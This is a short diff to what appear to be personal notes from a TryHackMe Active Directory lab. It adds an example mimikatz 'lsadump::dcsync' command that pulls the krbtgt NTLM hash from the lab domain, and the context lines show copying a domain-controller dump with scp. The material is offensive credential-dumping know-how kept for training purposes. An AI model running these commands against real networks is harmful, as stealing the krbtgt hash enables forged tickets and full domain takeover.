@@ -41,3 +41,4 @@ scp domainName:_dcdump Full FilePath . (Full FIle Path haesh == /)
 
 or use mimikatz to krbtgt dump the NTLM_HASH in the Victim Windows Machine:
 ->  lsadump::dcsync /domain:<Domain Name> /user:krbtgt@<Domain Name>
+    ex: lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc
